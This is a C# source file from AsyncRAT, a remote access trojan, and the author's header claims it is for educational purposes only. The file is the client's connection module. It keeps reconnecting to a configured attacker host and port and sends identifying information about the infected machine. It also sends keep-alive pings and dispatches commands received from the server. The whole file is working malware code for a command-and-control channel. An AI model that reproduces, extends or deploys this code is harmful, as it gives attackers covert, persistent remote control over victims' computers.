using Lime.Helper;
using Lime.Packets;
using Lime.Settings;
using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;

/* 
       │ Author       : NYAN CAT
       │ Name         : AsyncRAT  Simple RAT
       │ Contact Me   : https:github.com/NYAN-x-CAT
       | Credits      : Miraculous_DZ | N A P O L E O N

       This program is distributed for educational purposes only.
*/

namespace Lime.Connection
{
    public static class Client
    {
        private static Socket client = null;
        public static bool isConnected = false;
        private static MemoryStream memoryStream = null;
        private static Timer keepAlivePacket = null;

        public static void Run()
        {
            new Thread(TcpReceive).Start();
        }

        private static void TcpReceive()
        {
            while (true)
            {
                while (!isConnected)
                {
                    try
                    {
                        memoryStream?.Dispose();
                        keepAlivePacket?.Dispose();
                    }
                    catch { }

                    try
                    {
                        client?.Dispose();
                        //client?.Disconnect(false); // 2.0
                    }
                    catch { }

                    try
                    {
                        client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                        {
                            SendBufferSize = 999999,
                            ReceiveBufferSize = 999999,
                        };
                        client.Connect(Config.host, Convert.ToInt32(Config.port));
                        isConnected = true;
                        TcpSend(IdGenerator.SendInfo());
                        TimerCallback T = new TimerCallback(Ping);
                        keepAlivePacket = new Timer(T, null, 30000, 30000);
                        memoryStream = new MemoryStream();
                    }
                    catch
                    {
                        isConnected = false;
                        Thread.Sleep(3000);
                    }
                }

                while (isConnected)
                {
                    try
                    {
                        if (client.Poll(-1, SelectMode.SelectRead) && client.Available <= 0 || !client.Connected)
                        {
                            isConnected = false;
                            break;
                        }

                        byte[] buffer = new byte[client.Available];
                        client.Receive(buffer, 0, buffer.Length, SocketFlags.None);
                        memoryStream.Write(buffer, 0, buffer.Length);
                    rr:
                        if (StringConverter.BytestoString(memoryStream.ToArray()).Contains(Config.splitter))
                        {
                            Array[] array = (Array[])PacketFixer(memoryStream.ToArray(), Config.splitter);
                            new Thread(() =>
                            {
                                new PacketHandler().Handler((byte[])array[0]);
                            }).Start();
                            memoryStream.Dispose();
                            memoryStream = new MemoryStream();
                            if (array.Length == 2)
                            {
                                memoryStream.Write((byte[])array[1], 0, ((byte[])array[1]).Length);
                                goto rr;
                            }
                        }
                    }
                    catch
                    {
                        isConnected = false;
                        break;
                    }
                }
            }
        }

        private static void Ping(object state)
        {
            byte[] packet = StringConverter.StringToBytes("keepAlivePing!");
            TcpSend(packet);
            Debug.WriteLine("Pinged!");
            GC.Collect();
            GC.WaitForPendingFinalizers();
            GC.Collect();
        }

        private static void TcpSend(byte[] packet) //Send Data
        {
            if (!isConnected) return;
            try
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    byte[] splitter = StringConverter.StringToBytes(Config.splitter);
                    ms.Write(packet, 0, packet.Length);
                    ms.Write(splitter, 0, splitter.Length);
                    client.SendBufferSize = packet.Length;
                    client.Poll(-1, SelectMode.SelectWrite);
                    client.Send(ms.ToArray(), 0, (int)ms.Length, SocketFlags.None);
                }
            }
            catch
            {
                isConnected = false;
            }
        }

        public static void TcpSend(string S) //Send Data
        {
            TcpSend(StringConverter.StringToBytes(S));
        }

        private static Array PacketFixer(byte[] bytesArray, string splitter)
        {
            List<byte[]> a = new List<byte[]>();
            MemoryStream M = new MemoryStream();
            MemoryStream MM = new MemoryStream();
            string[] T = Strings.Split(StringConverter.BytestoString(bytesArray), splitter, -1, CompareMethod.Text);
            M.Write(bytesArray, 0, T[0].Length);
            MM.Write(bytesArray, T[0].Length + splitter.Length, bytesArray.Length - (T[0].Length + splitter.Length));
            a.Add(M.ToArray());
            a.Add(MM.ToArray());
            M.Dispose();
            MM.Dispose();
            return (a.ToArray());
        }
    }
}
